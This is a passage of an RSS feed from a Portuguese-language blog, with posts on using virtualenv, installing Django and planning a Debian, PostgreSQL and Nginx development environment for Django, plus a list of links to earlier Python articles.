&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;lib&lt;/code&gt;: Nesta pasta você encontrará os módulos e bibliotecas
&lt;em&gt;Python&lt;/em&gt; utilizadas por este ambiente.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;include&lt;/code&gt;: Segundo o &lt;a href=&quot;http://blog.triveos.com.br/2008/03/03/ambiente-isolado-para-python-com-virtualenv/&quot; title=&quot;Ambiente Isolado para Python com virtualenv&quot;&gt;&lt;em&gt;Osvaldo Santana&lt;/em&gt;&lt;/a&gt;, dentro desse diretório
estão os &lt;em&gt;links&lt;/em&gt; simbólicos para todos os &lt;em&gt;headers&lt;/em&gt; do &lt;em&gt;Python&lt;/em&gt; que
são necessário para se compilar extensões escritas em &lt;em&gt;C&lt;/em&gt; para ele.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Você apenas criou seu ambiente… para ativá-lo basta dar o seguinte
comando:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ source ~/projeto_django/bin/activate&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Se você executar o &lt;em&gt;Python&lt;/em&gt; agora, você estará utilizando as
&lt;em&gt;libs&lt;/em&gt; deste ambiente. Isso pode permitir que você mova este
ambiente entre máquinas, que você instale &lt;em&gt;libs&lt;/em&gt; somente neste ambiente
(deixando o &lt;em&gt;Python&lt;/em&gt; do seu &lt;em&gt;SO&lt;/em&gt; “limpo”, isso pode te garantir maior
performance da distro) e que você tenha um controle maior sobre as
dependências do seu projeto.&lt;/p&gt;
&lt;p&gt;Para “sair” do ambiente, basta executar o comando &lt;code class=&quot;language-text&quot;&gt;deactivate&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ deactivate&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto… muito simples, não?&lt;/p&gt;
&lt;h2&gt;Django&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/02/programando-python-para-a-web/&quot; title=&quot;Programando Python para Web&quot;&gt;Saiba um pouco mais sobre a programação &lt;em&gt;Python&lt;/em&gt; para &lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Vamos instalar o &lt;em&gt;Django&lt;/em&gt; neste ambiente isolado. Ativaremos
novamente o &lt;em&gt;virtualenv&lt;/em&gt; e usaremos o &lt;em&gt;*easy&lt;/em&gt;install*_ para nos
ajudar com esta tarefa:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ source ~/projeto_django/bin/activate
$ easy_install django&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;No final da operação, você irá se deparar com uma saída similar a esta:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Installed /home/user/projeto_django/lib/python2.6/site-packages/Django-1.2.5-py2.6.egg Processing dependencies for django Finished processing dependencies for django&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Isto é a garantia que o &lt;em&gt;Django&lt;/em&gt; foi &lt;strong&gt;instalado dentro deste
ambiente&lt;/strong&gt;, e não está visível para o escopo global da distribuição.
Tente importa o &lt;em&gt;Django&lt;/em&gt; no terminal interativo do &lt;em&gt;Python&lt;/em&gt; da sua
distro e do &lt;em&gt;Python&lt;/em&gt; do seu ambiente isolado e veja o que acontece…&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/04/entendendo-o-django/&quot; title=&quot;Entendendo o Django&quot;&gt;Entenda o que é o &lt;em&gt;Django&lt;/em&gt; e como ele funciona&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Montando seu ambiente de desenvolvimento Django no Linux]]></title><description><![CDATA[Vou iniciar uma série de publicações mostrando na prática como montar o
seu ambiente de desenvolvimento para trabalhar com Python e
Django. O objetivo é ilustrar como você pode facilmente ingressar no Django e
ter um conjunto de ferramentas simples e eficientes que lhe ajudarão a
desenvolver de…]]></description><link>https://klauslaube.com.br/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Thu, 03 Mar 2011 20:16:00 GMT</pubDate><content:encoded>&lt;p&gt;Vou iniciar uma série de publicações mostrando na prática como montar o
seu ambiente de desenvolvimento para trabalhar com &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e
&lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O objetivo é ilustrar como você pode facilmente ingressar no &lt;em&gt;Django&lt;/em&gt; e
ter um conjunto de ferramentas simples e eficientes que lhe ajudarão a
desenvolver de forma produtiva e com qualidade.&lt;/p&gt;
&lt;p&gt;Os tópicos serão os seguintes (sujeito a alteração):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django/&quot; title=&quot;Montando seu ambiente de desenvolvimento Django no Linux&quot;&gt;Motivação (este &lt;em&gt;post&lt;/em&gt;)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/03/07/diferentes-ambientes/&quot; title=&quot;Descubra a diferença entre os ambientes de desenvolvimento&quot;&gt;Diferentes ambientes: &lt;em&gt;Development&lt;/em&gt;, &lt;em&gt;Testing&lt;/em&gt;, &lt;em&gt;Staging&lt;/em&gt; e &lt;em&gt;Production&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/03/18/python-django-virtualenv/&quot; title=&quot;Python, Django e virtualenv&quot;&gt;&lt;em&gt;Python&lt;/em&gt;, &lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/04/11/como-organizar-seus-projetos-django/&quot; title=&quot;Conheça uma forma bacana para você organizar seus projetos Django&quot;&gt;Como organizar seus projetos &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte/&quot; title=&quot;Leia uma introdução ao Mercurial e saiba a razão de não falar sobre Git&quot;&gt;Como versionar projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt; – Parte 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2/&quot; title=&quot;Continuação do post sobre Mercurial e Django&quot;&gt;Como versionar projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt; – Parte 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/06/04/como-versionar-projetos-django-mercurial-parte-3/&quot; title=&quot;Parte final do tutorial sobre Mercurial e Django&quot;&gt;Como versionar projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt; – Parte 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1/&quot; title=&quot;Descubra que é possível sim escrever testes em Django&quot;&gt;Ferramentas de testes em &lt;em&gt;Django&lt;/em&gt; – Parte 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/07/23/ferramentas-de-testes-em-django-parte-2/&quot; title=&quot;A continuação do post sobre testes em Django com algumas ferramentas eficientes&quot;&gt;Ferramentas de testes em &lt;em&gt;Django&lt;/em&gt; – Parte 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep/&quot; title=&quot;Conheça o pep8, e deixe o seu código dentro das convenções do Python&quot;&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint/&quot; title=&quot;Assegure a qualidade do seu código utilizando o Pylint&quot;&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes/&quot; title=&quot;Conheça o Pyflakes, e garanta a qualidade do seu código Python&quot;&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/10/16/assegure-qualidade-seu-codigo-python-clone-digger/&quot; title=&quot;Aprenda a prevenir código duplicado com o Clone Digger&quot;&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;Clone Digger&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/11/20/migrations-em-django-south/&quot; title=&quot;Aprenda a fazer atualização da estrutura do seu banco de dados, de forma automatizada&quot;&gt;Migrations em &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2011/12/19/nginx-poderoso-rapido-facil/&quot; title=&quot;Conheça o Nginx! Uma alternativa mais poderosa ao Apache&quot;&gt;&lt;em&gt;Nginx&lt;/em&gt;: poderoso, rápido e fácil&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2012/01/23/supervisor-gerencie-os-processos-seu-servidor-web/&quot; title=&quot;Conheça o Supervisor, e tenha os processos do seu servidor, sob controle&quot;&gt;&lt;em&gt;Supervisor&lt;/em&gt;: Aumentando a disponibilidade das suas aplicações &lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2012/02/26/automatize-o-deploy-dos-seus-projetos-com-fabric/&quot; title=&quot;Veja um exemplo prático de automatização de deploy com Fabric&quot;&gt;Automatize o &lt;em&gt;deploy&lt;/em&gt; dos seus projetos com &lt;em&gt;Fabric&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1/&quot; title=&quot;Conheça o framework de cache do Django e como usá-lo com o Memcached&quot;&gt;&lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Cache&lt;/em&gt;: Uma dupla de alta performance – Parte 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2012/07/22/django-e-cache-uma-dupla-de-alta-performance-2/&quot; title=&quot;Conheça um pouco mais do framework de cache do Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Cache&lt;/em&gt;: Uma dupla de alta performance – Parte 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Criando um servidor para projetos &lt;em&gt;Django&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Requisitos&lt;/h2&gt;
&lt;p&gt;Existem centenas (senão milhares) de tutoriais deste tipo espalhados
pela &lt;a href=&quot;/tag/desenvolvimento-web.html&quot; title=&quot;Leia mais sobre Web&quot;&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, portanto, para variar um pouquinho vamos usar um
ambiente de desenvolvimento diferente:&lt;/p&gt;
&lt;h3&gt;Sistemas Operacionais: Debian e Slackware&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 120px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0b0df49865bd786ad46a2849f2e5ca02/070ae/tux.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 100%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAAEc0lEQVQ4y31Ue0ybVRS/ffA2ECA8EgqoYKaAhRgHhMxs/0BkIWGDAAb4axAlMUoMBBwkkGFQt0y2P3yMOVYH6AjDUZh7/cEoQ0pRaMEWioWOjQ9aBgxKHymlfPd471daS1y8ycl3vnPO79xz7nkg9JKTnJzMffl8PiosLEQlJSW88vJyXm5urscmNDSU0//viY2NRTqdjuPT09P5APAfhFwuF0RERHB8U1MTCgwMfLkzb0VFRYXASxXE4/FeI18RIY88IyODu6ympgYR/WFnNPTq6mqOr6urc0f1emtr61WpVMrIZDL78PCwbWBgQN3Y2FhHdL7UICsri7ONjIw8nL77p6ysjIsgPj7+/a6urh2WZcHhcMDGxgasr6+DyWQCg8EAbW1tCmIWRW0TEhL43j484ZJ3cV+RVl9f79jaegF2u91hNKyyd+4M4vFxOTaZtvetVqtDq9VCaWmpnNgKKSAgIODf6KKiuIsQKYD7/7FEIgGd7u+9tbU16Oq+hVPFqfiTTz/Dy4wRjAYDnpubczQ0NFDA5xQTExMjIAeJRCKPI3d0J6Kjo6Gh4Sx79949rFJO4ekJCR4dkoBqtBsmRwfwyKgcJJLrbFVVFfj5+emJI081yVO4mJSUFN8D2Rf+/v6QnZ3trKr6CCsUU3hcdhEcK8eBmfgQ1MoJ+OVmDz596hTOzMzENDFacAoUi8Vc+oi8FxcdSfPdtLS0DWpEisIqFAqg5/mGDWTSMzD5+ArscxLAHR0dWCgU7lPbvLy8R0TGBVRQUODKlJT9ZHFxMSQlJdEbnS0tLRzQZrOB07kHW9t7YLE6wbFrh91dB2CMIScnh7Ml2UB+fv4MdeMpTEhISImPj08jYSfJtIBer2dJhbHZbMYWixlsNgtYrRawWCyws2PC9PT397tT/jE4OLgyPDz8Lc5ZbW2td49/TCMljpyk9/Dm5iYl8CYqJ/2I5+fnITEx0Ukwr7rBcXFxLiYsLEx4IDvS3Nxsp43MMMt4ZYUhtEIJDojKwGg0OBmGgcrKilEKko2MCMnouhr6fCEPDUm/R9olE/egnZ03rj1bZuDJkyXnwqIeFhd0hBYOSAdEhpeWnmKlSgVX2ttPcwX96WdB3/MitHzBa6allwvcsxMweLtXPTerhr9UU+zM7CJWa+ZYtWaWndEsYs20cl8zo4Te7usSN3ZCccbVO/TsfstDqz8Ec64NX6P3zIMne7aUV59tqW/C5p/fOfX3z4JWPQXzmml4er8atv847zRpbuzbNO3L5gcFY2uXUBHFmvpEvPVLxI3qHI9Mi8vhWgfqh9V4gO2jAC/EAMYksA4gdlDSrO25dkG13YuswFD9GwA7yQArIljv5A+5RjcV6S7y6ZbwZO2b/Y7gRN9XqH1Sih6pHqCxoQ70sOYD4ZdEV0qopPC4sP7Xb9Ctsdu8h7/3ot+6zqHLx97mH6WjC5B4eCdmvsm5DiIL5BWE/MnG8I1HyIcQSiQbSezrwxfTLiDYWLJnY4gunPBBdNkUHRN4qvEPfSN4oqDCFWYAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Tux, o mascote do Linux&amp;quot;&quot;
        title=&quot;Tux, o mascote do Linux&quot;
        src=&quot;/static/0b0df49865bd786ad46a2849f2e5ca02/070ae/tux.png&quot;
        srcset=&quot;/static/0b0df49865bd786ad46a2849f2e5ca02/070ae/tux.png 120w&quot;
        sizes=&quot;(max-width: 120px) 100vw, 120px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Tux, o mascote do Linux&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Embora eu vá utilizar o &lt;a href=&quot;http://www.debian.org/&quot; title=&quot;Debian, uma das mais famosas e estáveis distros Linux&quot;&gt;&lt;em&gt;Debian 6&lt;/em&gt;&lt;/a&gt; no
ambiente de desenvolvimento, isolarei o ambiente de &lt;em&gt;staging&lt;/em&gt; em uma
máquina virtual. Nela, terei o &lt;a href=&quot;http://www.slackware.com/&quot; title=&quot;Slackware, uma das distros Linux mais &quot;&gt;&lt;em&gt;Slackware 13.1&lt;/em&gt;&lt;/a&gt; “básico”, e a partir
daí instalaremos banco de dados e servidor &lt;em&gt;Web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Não iremos abordar a instalação das distribuições… existem tutoriais
suficientes na Web sobre isto.&lt;/p&gt;
&lt;h3&gt;Banco de Dados: SQLite e PostgreSQL&lt;/h3&gt;
&lt;p&gt;Para o seu ambiente de desenvolvimento, o &lt;a href=&quot;http://www.sqlite.org/&quot; title=&quot;Baixe um dos bancos de dados mais simpáticos da atualidade&quot;&gt;&lt;em&gt;SQLite&lt;/em&gt;&lt;/a&gt; quebra um galho.
Pequeno, leve e suficientemente bom para quando você está desenvolvendo
suas aplicações com &lt;em&gt;Django&lt;/em&gt;. Porém, para ambientes de produção (onde a
demanda pode ser grande), o &lt;em&gt;SQLite&lt;/em&gt; é pouco recomendado… então podemos
escolher (tratando-se de bancos relacionais) entre o &lt;a href=&quot;http://www.mysql.com/&quot; title=&quot;MySQL, o banco de dados mais popular do mundo&quot;&gt;&lt;em&gt;MySQL&lt;/em&gt;&lt;/a&gt; e o
&lt;a href=&quot;http://www.postgresql.org/&quot; title=&quot;PostgreSQL, o banco de dados open source mais avançado do mundo&quot;&gt;&lt;em&gt;PostgreSQL&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Embora eu seja um usuário “fervoroso” do &lt;em&gt;MySQL&lt;/em&gt;, a aquisição dele pela
&lt;em&gt;Oracle&lt;/em&gt; me deixou com a pulga atrás da orelha. Então, vou aproveitar
para aprender um pouco mais sobre &lt;em&gt;PostgreSQL&lt;/em&gt; enquanto escrevo este
tutorial&lt;/p&gt;
&lt;h3&gt;Servidor Web: Nginx&lt;/h3&gt;
&lt;p&gt;Aposto que você achou que iríamos utilizar &lt;em&gt;Apache&lt;/em&gt; :D&lt;/p&gt;
&lt;p&gt;O &lt;a href=&quot;http://nginx.org/&quot; title=&quot;Um dos servidores Web mais &quot;&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; é considerado por alguns desenvolvedores o servidor &lt;em&gt;web&lt;/em&gt;
mais robusto da atualidade. &lt;a href=&quot;http://pt.wikipedia.org/wiki/Nginx&quot; title=&quot;Leia mais sobre Nginx na Wikipedia&quot;&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt;, é o quarto
servidor &lt;em&gt;web&lt;/em&gt; mais utilizado no mundo.&lt;/p&gt;
&lt;p&gt;Ótima oportunidade para usá-lo!&lt;/p&gt;
&lt;h3&gt;Python 2.x e Django 1.x.x&lt;/h3&gt;
&lt;p&gt;Até a data desta publicação, o &lt;em&gt;Python (2.x)&lt;/em&gt; estava em sua versão
&lt;a href=&quot;http://www.python.org/getit/&quot; title=&quot;Baixe o Python gratuitamente&quot;&gt;&lt;em&gt;2.7.1 (stable)&lt;/em&gt;&lt;/a&gt; e o &lt;a href=&quot;http://www.djangoproject.com/download/&quot; title=&quot;Baixe o Django gratuitamente&quot;&gt;&lt;em&gt;Django&lt;/em&gt; na 1.2.5 &lt;em&gt;(stable)&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Utilizarei a versão 2.6 do &lt;em&gt;Python&lt;/em&gt; por ser mais facilmente encontrada
nas hospedagens &lt;em&gt;web&lt;/em&gt;. Fique livre para escolher o que for melhor para
você.&lt;/p&gt;
&lt;p&gt;Se você quiser acompanhar a produção destes artigos, &lt;a href=&quot;https://klauslaube.com.br/feed/rss.xml&quot; title=&quot;Leia os posts deste Blog no seu leitor RSS favorito&quot;&gt;assine o &lt;em&gt;RSS&lt;/em&gt;&lt;/a&gt;
ou &lt;a href=&quot;http://www.twitter.com/kplaube&quot; title=&quot;Acompanhe o desenvolvimento deste e de outros posts&quot;&gt;siga-me no &lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até mais…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Motive-se: Por que usar Python e Django?]]></title><description><![CDATA[Se você ainda está em dúvida sobre utilizar Python
e Django, abaixo
segue uma compilação dos posts que já fiz
ao Profissionais TI
sobre esta fantástica linguagem de programação que é o Python, e esta
maravilhosa framework chamada Django: 10 motivos para você aprender a programar em Python Pense como…]]></description><link>https://klauslaube.com.br/2010/11/12/motive-se-por-que-usar-python-e-django.html</link><guid isPermaLink="false">https://klauslaube.com.br/2010/11/12/motive-se-por-que-usar-python-e-django.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Fri, 12 Nov 2010 19:20:00 GMT</pubDate><content:encoded>&lt;p&gt;Se você ainda está em dúvida sobre utilizar &lt;a href=&quot;http://www.python.org/&quot; title=&quot;Site oficial do Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;
e &lt;a href=&quot;http://www.djangoproject.com/&quot; title=&quot;Site oficial do Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, abaixo
segue uma compilação dos &lt;em&gt;posts&lt;/em&gt; que já fiz
ao &lt;a href=&quot;http://www.profissionaisti.com.br/author/klaus/&quot; title=&quot;Minhas contribuições ao Profissionais TI&quot;&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;
sobre esta fantástica linguagem de programação que é o &lt;em&gt;Python&lt;/em&gt;, e esta
maravilhosa &lt;em&gt;framework&lt;/em&gt; chamada &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/01/10-motivos-para-voce-aprender-a-programar-em-python/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;10 motivos para você aprender a programar em Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/06/pense-como-um-pythonista/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Pense como um Pythonista&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/06/codifique-como-um-verdadeiro-pythonista/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Codifique como um verdadeiro Pythonista&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/02/programador-python-aprendendo-java/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Programador Python aprendendo Java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/03/python-seja-hibrido-use-dialetos/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Python: Seja híbrido! Use dialetos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/02/programando-python-para-a-web/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Programando Python para a Web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/02/programando-em-django-no-seu-sistema-operacional-favorito/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Programando em Django no seu SO favorito&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/05/desenvolvendo-web-com-django-por-onde-comecar/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Desenvolvendo Web com Django: Por onde começar?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/04/entendendo-o-django/&quot; title=&quot;Leia este post no Profissionais TI&quot;&gt;Entendendo o Django&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Você possui algum link interessante para compartilhar? Nos mostre deixando um comentário...&lt;/p&gt;</content:encoded></item></channel></rss>